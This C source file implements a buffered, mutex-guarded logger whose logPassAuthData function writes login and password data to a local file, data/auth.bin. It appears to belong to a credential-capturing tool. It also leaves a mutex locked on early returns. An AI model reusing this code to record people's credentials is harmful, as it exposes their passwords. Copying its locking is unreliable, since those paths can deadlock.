#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "logger.h"
#include "utils.h"

char* logBuffer = NULL;
unsigned long logBufferSize = 0;
unsigned long currentBufferAllocationSize = 0;
static pthread_mutex_t logBufferMutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t writeToDiskMutex = PTHREAD_MUTEX_INITIALIZER;

void flushBuffer()
{
    FILE* fHandle = NULL;

    while (pthread_mutex_lock(&writeToDiskMutex) == EDEADLK) {}

    if (logBufferSize == 0)
        return;

    // TODO : make it dynamic
    fHandle = fopen("data/auth.bin", "ab");
    if (!fHandle)
        return;

#ifdef PM_DEBUG_1
    puts("[+] Writing to disk..");
#endif

    fwrite(logBuffer, logBufferSize, sizeof(char), fHandle);
    fclose(fHandle);

    logBufferSize = 0;

    pthread_mutex_unlock(&writeToDiskMutex);

    return;
}

void freeLogBuffer()
{
    if (logBuffer) {
        free(logBuffer);
        logBufferSize = 0;
        currentBufferAllocationSize = 0;
    }
}

void logIntoBuf(log_identifier type, char* data, unsigned long dataSize)
{
    char* logBufferPtr = NULL;
    unsigned long dataNeeded = 0;

    if (!data)
        return;

    while (pthread_mutex_lock(&logBufferMutex) == EDEADLK ) {}

    dataNeeded = dataSize + sizeof(log_entry_header);

    // Is there still place?
    if ( dataNeeded > (currentBufferAllocationSize - logBufferSize) ) {

#ifdef PM_DEBUG_1
        puts("[+] Flush buffer before writing again.");
#endif

        // Flush data
        if (logBufferSize != 0)
            flushBuffer();

        // Allocate enough memory to hold the data
        if (dataNeeded > currentBufferAllocationSize || logBuffer == NULL) {
#ifdef PM_DEBUG_1
            puts("[+] Allocate a bigger buffer.");
#endif
            if (currentBufferAllocationSize == 0)
                currentBufferAllocationSize = INIT_BUFFER_SIZE;

            // Increase max size if 'dataNeeded' needs more place
            while (dataNeeded > currentBufferAllocationSize) {
                currentBufferAllocationSize *= 2;
            }

            // Realloc
            if (logBuffer != NULL)
                free(logBuffer);

            logBuffer = (char*)utils_malloc((size_t)currentBufferAllocationSize);
        }

        logBufferSize = 0;
    }

    logBufferPtr = logBuffer + logBufferSize;

    // Log into the buffer
    ((log_entry_header*)logBufferPtr)->logType = (unsigned long)type;
    ((log_entry_header*)logBufferPtr)->entrySize = dataNeeded;
    memcpy(logBufferPtr + sizeof(log_entry_header), data, dataSize);

    logBufferSize = logBufferSize + dataNeeded;

    pthread_mutex_unlock(&logBufferMutex);

    return;
}

void logPassAuthData (
    unsigned long id,
    unsigned long h_length,
    unsigned char* h_login,
    unsigned char* h_pass)
{
    unsigned char *log_data = NULL, *tmp = NULL;
    unsigned long log_data_size = 0;

    // Count space only for fields that will be present for sure (even if ==
    // 0) in the structure
    log_data_size = sizeof(unsigned long) * 2;

    if (h_login != NULL) {
        log_data_size += h_length;
    }
    if (h_pass != NULL) {
        log_data_size += h_length;
    }

    // Copy data
    log_data = utils_malloc((size_t)log_data_size);

    ((pass_auth_log*)log_data)->id = id;
    ((pass_auth_log*)log_data)->h_length = h_length;

    tmp = (unsigned char*) &((pass_auth_log*)log_data)->h_login;

    if (h_login != NULL) {
        memcpy(tmp, h_login, h_length);
        tmp += h_length;
    }
    if (h_pass != NULL) {
        memcpy(tmp, h_pass, h_length);
        tmp += h_length;
    }

    printf("log_data_size: %ld\n", log_data_size);
    logIntoBuf(pass_auth_log_id, (char*)log_data, log_data_size);

    free(log_data);

    return;
}
